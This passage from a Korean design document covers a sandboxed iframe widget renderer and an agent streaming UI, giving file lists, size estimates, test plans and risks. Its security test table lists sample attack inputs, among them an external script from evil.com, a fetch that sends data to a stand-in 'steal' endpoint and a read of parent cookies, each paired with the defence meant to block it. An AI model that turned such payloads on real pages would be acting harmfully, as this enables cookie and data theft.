| `apps/app-mockup/src/components/shared/WidgetRenderer.tsx` | 신규 | iframe Sandboxed 위젯 렌더러 |
| `apps/app-mockup/src/components/shared/AgentRunPanel.tsx` | 신규 | 에이전트 실행 상태 UI |
| `apps/app-mockup/src/components/shared/PolicyApprovalCard.tsx` | 신규 | 정책 승인 HITL 카드 |
| `apps/app-mockup/src/components/shared/EntityConfirmation.tsx` | 신규 | 엔티티 매핑 확인 |
| `apps/app-mockup/src/components/shared/ParameterInput.tsx` | 신규 | 파라미터 입력 폼 |
| `apps/app-mockup/src/contexts/AgentStreamContext.tsx` | 신규 | AG-UI 스트림 Context Provider |
| `apps/app-mockup/src/lib/agent-stream.ts` | 신규 | SSE 파서 + 이벤트 디스패처 |
| `apps/app-mockup/src/lib/decision-matrix.ts` | 신규 | 데이터 특성 분석 + 시각화 선택 |
| `apps/app-mockup/src/lib/widget-theme.ts` | 신규 | 테마 변수 시리얼라이저 |
| `apps/app-mockup/src/types/widget.ts` | 신규 | Widget 프론트엔드 타입 |
| `services/svc-mcp-server/src/routes/agent-run.ts` | 신규 | AG-UI SSE 엔드포인트 |
| `services/svc-mcp-server/src/agent-session-do.ts` | 신규 | 에이전트 세션 DO |
| `services/svc-mcp-server/src/env.ts` | 수정 | 신규 바인딩 타입 추가 |
| `services/svc-mcp-server/src/index.ts` | 수정 | /agent/* 라우트 추가 |
| `services/svc-mcp-server/wrangler.toml` | 수정 | service binding + DO 추가 |

### 9.3 총 예상 규모

| 모듈 | 파일 수 | 예상 LOC |
|------|---------|----------|
| 공유 타입 (agent-ui.ts) | 1 | ~200 |
| Widget Renderer + Theme + Bridge | 3 | ~450 |
| Decision Matrix | 1 | ~250 |
| AG-UI Client (Context + SSE 파서) | 2 | ~350 |
| AgentRunPanel + HITL 3종 | 4 | ~600 |
| svc-mcp-server 확장 (라우트 + DO) | 3 | ~500 |
| Demo 5 페이지 | 2 | ~400 |
| 타입 + 설정 | 3 | ~100 |
| **합계** | **19** | **~2,850** |

---

## 10. Test Plan

### 10.1 단위 테스트

| 대상 | 테스트 항목 | 파일 |
|------|------------|------|
| `sanitizeWidgetContent()` | meta refresh 제거, base 태그 제거, window.open 차단, 50KB 제한 | `widget-renderer.test.ts` |
| `buildSrcdoc()` | CSP 메타 태그 포함, 테마 변수 주입, Bridge 스크립트 포함 | `widget-renderer.test.ts` |
| `buildThemeStyle()` | light/dark 변수 정확성, CSS 구문 유효성 | `widget-theme.test.ts` |
| `analyzeDataCharacteristics()` | 시계열 감지, 계층 감지, 그래프 감지 | `decision-matrix.test.ts` |
| `selectVisualizationType()` | 8가지 분기 커버리지 (graph/diagram/chart/table/form/markdown) | `decision-matrix.test.ts` |
| `parseSSEEvent()` | SSE 형식 파싱, 불완전 이벤트 무시 | `agent-stream.test.ts` |
| `dispatchAgUiEvent()` | 7가지 이벤트 타입별 dispatch 검증 | `agent-stream.test.ts` |
| `agentStreamReducer()` | 상태 전이 (idle→connecting→running→paused→completed) | `agent-stream-context.test.ts` |
| AG-UI Zod 스키마 | 유효/무효 페이로드 검증 | `agent-ui.test.ts` |

### 10.2 보안 테스트

| 시나리오 | 공격 벡터 | 기대 동작 |
|----------|----------|-----------|
| 외부 스크립트 로딩 | `<script src="https://evil.com/xss.js">` | CSP `script-src 'unsafe-inline'`에 의해 차단 |
| fetch/XHR 호출 | `fetch("https://evil.com/steal?data=...")` | CSP `default-src 'none'`에 의해 차단 |
| 부모 DOM 접근 | `parent.document.cookie` | sandbox에서 `allow-same-origin` 미허용으로 SecurityError |
| postMessage 위조 | 다른 origin에서 메시지 전송 | `event.source !== iframeRef.contentWindow` 검증으로 무시 |
| HTML 크기 공격 | 100MB 크기의 SVG | `sanitizeWidgetContent()` 50KB 제한으로 거부 |

### 10.3 성능 테스트

| 항목 | 기준 | 측정 방법 |
|------|------|-----------|
| Widget 초기 렌더링 | < 500ms | `performance.mark()` → `performance.measure()` |
| SSE 이벤트 전송 지연 | < 200ms | 서버 `timestamp` vs 클라이언트 `Date.now()` 비교 |
| 테마 동기화 | < 100ms | `postMessage` → iframe 내 `MutationObserver` 콜백 |
| HITL 재개 → SSE 응답 | < 1s | `/agent/resume` POST → 다음 SSE 이벤트 수신 |

---

## 11. Risks and Mitigation

| Risk | Impact | Mitigation |
|------|--------|------------|
| **iframe 성능** — 복잡한 D3 그래프에서 렌더링 지연 | Medium | Widget 크기 제한 (50KB) + 단순 시각화는 iframe 없이 직접 렌더링 옵션 |
| **LLM 생성 HTML 품질 편차** | High | Decision Matrix 표준화 + 유형별 Golden Template + 실패 시 마크다운 fallback |
| **Workers 30초 timeout** — 복잡한 에이전트 실행 | High | SSE 스트림 중간 이벤트 전송으로 연결 유지 + DO 기반 청크 실행 |
| **Mermaid.js 번들 크기** (~2MB) | Medium | 필요 다이어그램 타입만 트리셰이킹 또는 서버 사이드 SVG 렌더링 |
| **sandbox iframe origin 검증 한계** | Low | `event.source` 비교 + BridgeActionSchema Zod 검증으로 보완 |
| **AG-UI Protocol 미성숙** | Medium | 코어 이벤트 타입만 채택, 커스텀 확장 최소화 |

---

## Version History

| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 1.0 | 2026-03-18 | Initial draft — 8 컴포넌트 상세 설계 + AG-UI Protocol + Security 5-Layer + Theme System + Server 확장 | Sinclair Seo |
